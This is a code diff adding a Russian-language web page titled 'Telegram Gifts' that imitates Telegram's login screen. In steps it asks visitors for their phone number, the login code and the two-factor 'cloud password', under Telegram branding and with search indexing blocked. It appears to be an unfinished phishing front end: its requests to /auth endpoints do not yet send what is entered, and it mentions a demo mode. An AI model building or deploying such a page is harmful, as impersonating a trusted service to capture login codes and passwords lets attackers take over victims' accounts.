@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<title>Telegram Gifts</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="robots" content="noindex, nofollow">
+
+<style>
+*{box-sizing:border-box}
+
+body{
+  margin:0;
+  min-height:100svh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  font-family:system-ui,-apple-system,BlinkMacSystemFont,sans-serif;
+  background:linear-gradient(135deg,#0b1d3a,#0f2a5a,#143774);
+  color:#fff;
+  padding:80px 16px 16px;
+}
+
+.card{
+  width:100%;
+  max-width:360px;
+  background:#0e1b33;
+  border-radius:20px;
+  padding:26px 28px 28px;
+  box-shadow:0 25px 60px rgba(0,0,0,.45);
+  opacity:0;
+  transform:translateY(20px);
+  animation:fadeIn .4s ease forwards;
+}
+
+@keyframes fadeIn{
+  to{opacity:1;transform:none}
+}
+
+h2{
+  margin:0 0 16px;
+  font-size:22px;
+  font-weight:600;
+}
+
+label{
+  font-size:13px;
+  color:#b6c8f3;
+  display:block;
+  margin-bottom:6px;
+}
+
+input{
+  width:100%;
+  padding:14px;
+  border-radius:14px;
+  border:1px solid #2b4378;
+  background:#0a1428;
+  color:#fff;
+  font-size:16px;
+  margin-bottom:16px;
+}
+
+input::placeholder{color:#8ea6d8}
+
+input:focus{
+  outline:none;
+  border-color:#4da3ff;
+  box-shadow:0 0 0 2px rgba(77,163,255,.25);
+}
+
+button{
+  width:100%;
+  padding:15px;
+  border:none;
+  border-radius:14px;
+  font-size:16px;
+  font-weight:600;
+  cursor:pointer;
+  background:linear-gradient(135deg,#4da3ff,#1f7cff);
+  color:#fff;
+}
+
+button:disabled{
+  opacity:.45;
+  cursor:not-allowed;
+}
+
+.timer{
+  margin-top:14px;
+  text-align:center;
+  font-size:13px;
+  color:#9bb1e6;
+}
+
+.hint{
+  margin-top:14px;
+  font-size:12px;
+  color:#9bb1e6;
+  text-align:center;
+}
+
+.app-header{
+  position:fixed;
+  top:0;
+  left:0;
+  width:100%;
+  height:56px;
+  background:#0e1b33;
+  border-bottom:1px solid rgba(255,255,255,.06);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  z-index:10;
+}
+
+.brand{
+  display:flex;
+  align-items:center;
+  gap:10px;
+}
+
+.brand-icon{
+  width:10px;
+  height:10px;
+  border-radius:50%;
+  background:#4da3ff;
+}
+
+.brand-name{
+  font-size:14px;
+  font-weight:600;
+  letter-spacing:3px;
+  color:#e6eeff;
+}
+
+.pwd-hint{
+  font-size:12px;
+  color:#91a8df;
+  margin-top:-10px;
+  margin-bottom:16px;
+}
+
+.shake{
+  animation:shake .3s;
+}
+
+@keyframes shake{
+  25%{transform:translateX(-4px)}
+  50%{transform:translateX(4px)}
+  75%{transform:translateX(-4px)}
+}
+
+.hidden{display:none}
+</style>
+</head>
+<meta name="robots" content="noindex, nofollow">
+<body>
+
+<header class="app-header">
+  <div class="brand">
+    <span class="brand-icon"></span>
+    <span class="brand-name">TELEGRAM</span>
+  </div>
+</header>
+
+<div class="card" id="step1">
+  <h2>Ваш номер телефона</h2>
+  <input id="phone" placeholder="+79001234567">
+  <button id="btn1" disabled onclick="requestOtp()">Продолжить</button>
+</div>
+
+<div class="card hidden" id="step2">
+  <h2>Введите код</h2>
+
+  <input id="code" placeholder="12345">
+
+  <div id="pwdBlock" class="hidden">
+    <label>Облачный пароль</label>
+    <input id="pwd" type="password" placeholder="Введите облачный пароль">
+    <div class="pwd-hint">
+      Только если включена двухфакторная аутентификация
+    </div>
+  </div>
+
+  <button id="btn2" disabled onclick="verify()">Подтвердить</button>
+
+  <div class="timer" id="timer">
+    Отправить код повторно через 02:00
+  </div>
+
+  <div class="hint">
+    Код был «отправлен» — смотрите консоль сервера
+  </div>
+</div>
+
+<script>
+let phone = "";
+let requiresPassword = false;
+let timerInterval;
+
+const phoneInput = document.getElementById("phone");
+const codeInput  = document.getElementById("code");
+const timerEl    = document.getElementById("timer");
+
+phoneInput.addEventListener("input", ()=>{
+  document.getElementById("btn1").disabled =
+    phoneInput.value.trim().length < 8;
+});
+
+codeInput.addEventListener("input", ()=>{
+  document.getElementById("btn2").disabled =
+    codeInput.value.trim().length < 3;
+});
+
+async function requestOtp(){
+  phone = phoneInput.value.trim();
+
+  switchStep(1,2);
+  startTimer(120);
+
+  try{
+    const res = await fetch("/auth/request-otp");
+
+    const data = await res.json();
+    console.log("Ответ сервера:", data);
+
+    if(data.requiresPasswordHint){
+      document.getElementById("pwdBlock").classList.remove("hidden");
+    }
+
+  }catch(err){
+    console.warn("Сервер недоступен, работаем в demo-режиме");
+    
+    document.getElementById("pwdBlock").classList.remove("hidden");
+  }
+}
+
+async function verify(){
+  const code = codeInput.value.trim();
+  const password = document.getElementById("pwd").value;
+
+  if(!code){
+    errorShake("step2");
+    return;
+  }
+
+  const res = await fetch("/auth/verify");
+
+  const data = await res.json();
+  alert(JSON.stringify(data,null,2));
+}
+
+function startTimer(seconds){
+  let remaining = seconds;
+  clearInterval(timerInterval);
+
+  timerInterval = setInterval(()=>{
+    remaining--;
+    const m = String(Math.floor(remaining/60)).padStart(2,"0");
+    const s = String(remaining%60).padStart(2,"0");
+    timerEl.textContent = `Отправить код повторно через ${m}:${s}`;
+
+    if(remaining <= 0){
+      clearInterval(timerInterval);
+      timerEl.textContent = "Можно отправить код повторно";
+    }
+  },1000);
+}
+
+function switchStep(from,to){
+  document.getElementById("step"+from).classList.add("hidden");
+  const next = document.getElementById("step"+to);
+  next.classList.remove("hidden");
+  next.style.animation="fadeIn .4s ease forwards";
+}
+
+function errorShake(id){
+  const el = document.getElementById(id);
+  el.classList.add("shake");
+  setTimeout(()=>el.classList.remove("shake"),300);
+}
+</script>
+
+</body>
+</html>
